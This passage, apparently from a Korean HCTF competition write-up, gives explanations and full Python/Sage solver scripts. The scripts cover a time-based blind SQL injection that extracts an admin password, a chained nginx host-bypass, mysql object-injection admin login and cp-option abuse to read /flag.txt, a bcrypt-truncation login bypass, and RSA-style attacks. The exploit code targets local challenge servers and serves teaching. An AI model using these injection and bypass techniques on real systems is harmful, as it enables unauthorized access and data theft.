특별히 에러가 출력되거나, update문에서 취약점이 발생하기 때문에 값을 확인할 수 있는 방법이 없습니다. 따라서, Side channel attack을 해야하는데, 이 경우 time based sql injection이 가능합니다.

##### ex.py
```py
import requests
from binascii import hexlify
from os import urandom

HOST = "http://local.vuln.live:10000"
TIMEOUT = 1.5
FLAG = "HCTF{"
COOKIE = {"PHPSESSID":"sqrtrev"}

def gen_random_str(length):
    return hexlify(urandom(length)).decode()

def register(username, password):
    conn = requests.post(HOST+"/?mode=register", data={"username":username, "password":password}, cookies=COOKIE)

def login(username, password):
    conn = requests.post(HOST+"/?mode=login", data={"username":username, "password":password}, cookies=COOKIE)

def exp(password):
    global FLAG

    while True:
        if "}" in FLAG:
            break

        for i in range(32, 127):
            query = gen_random_str(4)
            query += f"' where if(ord(substr((select password from users where username='admin'),{len(FLAG) + 1},1))={i}, sleep({TIMEOUT}), 0)#"

            register(query, password)
            login(query, password)
            try:
                requests.post(HOST, cookies=COOKIE, timeout=TIMEOUT)
            except requests.exceptions.Timeout:
                FLAG += chr(i)
                print(FLAG)

if __name__ == "__main__":
    password = gen_random_str(4)
    exp(password)
    print("FLAG:",FLAG)
```

#### simple_archive
stage 1

nginx에서는 path 부분에 /asdf 대신 http://asdf.com/asdf로 해도 작동합니다. server_name은 첫 번째로 path에서, 두 번째로 host에서 가져오기에 host와 server_name은 달라질 수 있습니다. 이를 이용하여 node에 접근할 수 있습니다.

stage 2

nodejs mysql 라이브러리의 well-known sql injection 취약점을 이용하여 admin으로 로그인할 수 있습니다.

stage3

cp 명령어 option을 통해 권한 없는 곳에 복사하여 error를 낸 후 계정 경로를 알아낸 후 복사하면 플래그를 획득할 수 있습니다.

##### ex.py
```py
import subprocess
import json
import base64
import os

BASE_URL = "http://local.sqli.kr:8000"
def send_request(url, body, cookie=False, file_flag=False):
    command = [
            "curl",
            "-i",
            "-XPOST",
            BASE_URL,
            "--request-target",
            url,
            "-H",
            "Host: wafzz"
    ]
    if cookie != False:
        command.append("-H")
        command.append(f"Cookie: {cookie}")
    if file_flag != False:
        command.append("-F")
        command.append("file=@./asdf.txt")
    else:
        command.append("-H")
        command.append("Content-Type: application/json")
        command.append("-d")
        command.append(json.dumps(body))
    proc = subprocess.run(
        command,
        capture_output=True,
        text=True,
    )
    assert proc.returncode == 0
    return proc.stdout

bypass_url = "http://asdf.node"

idpw = os.urandom(2).hex()

send_request(bypass_url + "/register", {"username":idpw,"password":idpw})
cookie = send_request(bypass_url + "/login", {"username":idpw,"password":idpw}).split("\n")[8].split(" ")[1]
#print(cookie)
send_request(bypass_url + "/upload", "asdf", cookie, True)
admin_cookie = send_request(bypass_url + "/login", {"username":"admin","password":{"password":"1"}}).split("\n")[8].split(" ")[1]
#print(admin_cookie)
send_request(bypass_url + "/upload", "asdf", admin_cookie, True)
user_path = "./uploads/" + send_request(bypass_url + "/admin", {"options":["./uploads/.","/boot","-S"]}, admin_cookie, False).split(idpw)[0][-17:] + idpw
#print(user_path)
send_request(bypass_url + "/admin", {"options":["-t",user_path,"/flag.txt","-S"]}, admin_cookie, False)

print('HCTF{'+send_request(bypass_url + "/file", {"filename":"flag.txt"}, cookie, False).split("HCTF{")[1].split("}")[0]+'}')
```

##### asdf.txt
```plaintext
asdf
```

### Crypto
#### atko

이 문제의 이름은 okta에서 착안하였습니다. [이 문서](https://trust.okta.com/security-advisories/okta-ad-ldap-delegated-authentication-username/)는 okta의 보안 권고에서 파생된 취약점 분석입니다.

```python
def gen_cache_key(user_id, username, password, salt):
    return bcrypt.hashpw(user_id + username + password, salt)
```

이 함수는 `user_id`, `username`, `password`를 이어 붙여 bcrypt 해시 키를 생성합니다.  
하지만 다음과 같은 제약 조건이 존재합니다.

- 한 사용자 계정의 `username` 길이는 **항상 39바이트**입니다.
- `user_id`는 **32바이트**로 고정되어 있습니다.
- bcrypt는 입력 문자열의 최대 길이가 **72바이트**로 제한됩니다.

따라서 아래와 같이 계산할 수 있습니다.

```
72 - 32(user_id) - 39(username) = 1
```

즉, password의 **선두 1바이트(2 hex digit)만 유효하고**, 나머지는 무시됩니다. 이로 인해 bcrypt 입력 값은 password 전체가 아닌 **첫 1바이트(8비트)**만 반영되며, 그 결과 캐시 키 생성 시 password가 사실상 **4비트만 brute-force 하면** 인증 우회가 가능해집니다.

이를 악용하면,

- 해당 username에 대해 password prefix를 16가지 경우의 수로 브루트포스하고,
- 성공 시 로그인 및 메모(memo) 데이터 접근이 가능하게 됩니다.

##### ex.py
```python
from string import hexdigits

import pwn

pwn.context.log_level = "DEBUG"
DEBUG = False
if DEBUG:
    tn = pwn.process(["python3.10", "../prob/for_organizer/chall.py"])
else:
    tn = pwn.remote("localhost", 43625)

    def PoW():
        import subprocess

        tn.recvuntil(b"python3 <(curl -sSL https://goo.gle/kctf-pow) solve ")
        token = tn.recvline(keepends=False).decode()
        pwn.log.info(f"PoW token = {token}")
        result = subprocess.run(
            f'bash -c "python3 <(curl -sSL https://goo.gle/kctf-pow) solve {token}"',
            shell=True,
            capture_output=True,
        ).stdout.strip()
        pwn.log.info(f"PoW solution = {result.decode()}")
        tn.sendlineafter(b"Solution? ", result)
        validation = tn.recvline(keepends=False).decode()
        pwn.log.info(f"PoW {validation = }")

    PoW()


def login(username, password):
    tn.recvuntil(b"menu> \n")
    tn.sendline(b"login")
    tn.sendline(username)
    tn.sendline(password)
    return b"Invalid" not in tn.recvline(keepends=False)


usernames = set()
while True:
    payload = tn.recvline()
    if b"@" in payload:
        usernames.add(payload.split()[1].decode())
    else:
        tn.unrecv(b"menu> \n")
        break

max_len_username = ""
for username in usernames:
    if len(max_len_username) < len(username):
        max_len_username = username

pwn.log.info(f"{max_len_username = }")

target_password = None
target_username = max_len_username.encode()
for cand in hexdigits:
    password_ex = cand.lower().encode() + b"01234"
    pwn.log.info("Trying: " + password_ex.decode())
    if login(target_username, password_ex):
        target_password = password_ex
        pwn.log.success("Found!")
        break

login(target_username, target_password)

tn.recvuntil(b"menu> \n")
tn.sendline(b"memo")

flag = tn.recvline(keepends=False).decode()
pwn.log.success(f"{flag = }")

tn.close()
```

#### backforth

#####  chall.py
```python
import random, hashlib

def expand(msg):
    msg = hashlib.sha512(msg).digest()
    return int.from_bytes(msg + hashlib.sha512(msg).digest())

flag = open("flag.txt", "rb").read()
s1 = expand(flag)
s2 = expand(flag[::-1])

a1 = random.getrandbits(1024)
a2 = random.getrandbits(1024)

c1 = pow(a1, 0x10001, s1)
# c2 = pow(s2, 0x10001, a2)
c2 = pow(s2, 100000007, a2)

print([a1, c1])
print([a2, c2])

if [int(s) for s in input("secrets: ").split()] == [s1, s2]:
    print(flag.decode())
```

고정되어 있는 비밀 값 `s1, s2` 를 찾으면 플래그를 획득할 수 있습니다. 고정된 값이기 때문에 여러 횟수의 접속을 이용할 수 있을 것이라고 추측 가능합니다.

1. `s1` 구하기

`pow(a1, 0x10001, s1) = c1` 이기 때문에 `a1^0x10001 - c1` 은 `s1` 의 배수이고, 이 쌍을 여럿 모아 최대공약수를 구하여 `s1` 을 구할 수 있습니다. 그러나 `a1^0x10001 - c1` 은 큰 값이기 때문에 연산에 오랜 시간이 걸립니다. 두 쌍에 대한 최대공약수를 한 번 구한 후부터는 `pow` 함수를 사용해서 다음 쌍들에 대해서도 추가로 계산 가능하나, 최소 두 회의 무거운 연산은 필요합니다.

2. `s2` 구하기
`pow(s2, 100000007, a2) = c2` 입니다. 하스타드 공격이 이론상 가능하지만, 지수가 100000007로 매우 크기 때문에 현실적으로 어렵습니다. `a2` 는 매 접속시 랜덤한 1024비트(이하) 정수로 설정되기 때문에 작은 소수들이 `a2` 의 소인수가 되는 경우는 매우 흔합니다. 얘를 들어 `a2` 가 17의 배수라면 `pow(s2, 100000007, 17) = c2 % 17` 이기 때문에 RSA 복호화와 방법으로 `s2 % 17` 을 구할 수 있습니다. 이러한 쌍들을 모아서 1024비트가 넘어가게 설정하면 CRT를 사용해 `s2` 를 복구 가능합니다.

##### ex.sage
```python
from pwn import process, remote
from tqdm import trange
from ast import literal_eval

def new_instance():
    # return remote(..)
    return process(["python3", "chall.py"])

primes = Primes()[1:1000]

s1 = 0

pr = 1
mods = []
rems = []

ac1s = []

while True:
    io = new_instance()
    a1, c1 = literal_eval(io.recvline().decode()[:-1])
    ac1s.append([a1, c1])
    a2, c2 = literal_eval(io.recvline().decode()[:-1])
    io.close()

    for p in primes:
        if a2 % p != 0:
            continue
        if p in mods:
            continue

        if c2 % p == 0:
            mods.append(p)
            rems.append(0)
            pr *= p
            continue

        phi = p - 1
        if phi % 100000007 == 0:
            continue
        d = pow(100000007, -1, phi)


        s2_p = pow(c2, d, p)
        mods.append(p)
        rems.append(s2_p)
        pr *= p

    if pr > 2^1030:
        break
s2 = crt(rems, mods)

assert 1000 < s2.bit_length() <= 1024

import time

vals = []
for i in range(2):
    a1, c1 = ac1s[i]
    print("Calculating big number...")
    st = time.time()
    vals.append(a1^0x10001 - c1)
    en = time.time()
    print(f"Took {(en - st):.2f}s")
print("Calculating big gcd...")
st = time.time()
g = gcd(vals[0], vals[1])
en = time.time()
print(f"GCD took {(en - st):.2f}s")

"""
Calculating big number...
Took 34.11s
Calculating big number...
Took 33.58s
Calculating big gcd...
GCD took 9.93s
"""

for a1, c1 in ac1s:
    g = gcd(pow(a1, 0x10001, g) - c1, g)
s1 = g
assert 1000 < s1.bit_length() <= 1024

io = new_instance()

io.sendline(f"{s1} {s2}".encode())
io.recvuntil(b"secrets: ")



io.interactive()
```

기종에 따라 `1024 * 0x10001` 비트의 정수를 사용함에 있어 더 오랜 시간이 소모될 수 있습니다.

#### ff

Fermat 소인수분해 기법은 두 소수의 차이가 작을 경우, RSA 모듈러스 $N = p \times q$를 빠르게 분해할 수 있는 고전적인 알고리즘입니다. 이 기법은 특히 $p \approx q$일 때 효과적이며, 개선된 버전은 known ratio 정보를 활용해 multiplier를 조정하는 방식으로도 사용됩니다. 관련 내용은 [이 문서](https://en.wikipedia.org/wiki/Fermat%27s_factorization_method#Multiplier_improvement)에서 확인할 수 있습니다

**ff** 문제의 풀이 목표는 이 기법으로 정확히 `0x1337`번의 반복(iteration) 끝에 소인수분해가 가능한 **약한 RSA 모듈러스**를 생성하는 것입니다. 반복 횟수는 두 소수 간의 차이에 비례하므로, 적절히 큰 차이를 갖는 $(p, q)$ 쌍을 brute-force 방식으로 찾아야 합니다. 반복 횟수의 이론적 복잡도에 대해서는 [이 논문](https://eprint.iacr.org/2009/318.pdf)을 참고해주세요.

##### ex.py
```python
import random
import gmpy2
import pwn
from Crypto.Util.number import isPrime

gmpy2.get_context().precision = 2048


def ff(n):
    a = int(gmpy2.sqrt(n))

    a2 = a * a
    b2 = gmpy2.sub(a2, n)

    cnt = 0
    while True:
        a += 1
        b2 = a * a - n
        cnt += 1

        if cnt > 0x1337:
            print("FAILFAST")
            return 0, 0, 0

        if gmpy2.is_square(b2):
            b2 = gmpy2.mpz(b2)
            b = int(gmpy2.sqrt(b2))
            return a + b, a - b, cnt


def mine():
    u, v = 5, 7
    s = set()
    max_count = 0

    while True:
        rnd = random.getrandbits(512) | (1 << 511)
        ofs = random.getrandbits(256 + 5)
        p = gmpy2.next_prime(rnd * u)
        q = gmpy2.next_prime((rnd + ofs) * v)

        n = p * q
        p_rec, q_rec, count = ff(n * u * v)

        if p_rec == 0 or q_rec == 0:
            continue

        s.add(count)
        max_count = max(count, max_count)
        print(count, len(s), max_count)  # , p.bit_length(), q.bit_length())

        p_rec = gmpy2.gcd(n, p_rec)
        q_rec = gmpy2.gcd(n, q_rec)
        assert p_rec != q_rec and isPrime(p_rec) and isPrime(q_rec)
        assert (p, q) == (p_rec, q_rec) or (q, p) == (p_rec, q_rec)

        if count == 0x1337:
            return n


DEBUG = False
if DEBUG:
    # takes about less than 10 minutes
    n = mine()
else:
    p = 57019206674346639190792159216356002548565650380434438999494138481148221995018636719405899922124151520408261694501043375971473247807135348468326351809159621
    q = 40728004767390456564851542297397144677546893128881742142495813200820158567855323315324519232442500444582091562749249206343957987824991688335918172654566683
    n = p * q

tn = pwn.remote("localhost", 43623)

tn.sendlineafter(b"n = ", str(n).encode())
flag = tn.recvline(keepends=False).decode()

pwn.log.success(flag)

tn.close()
```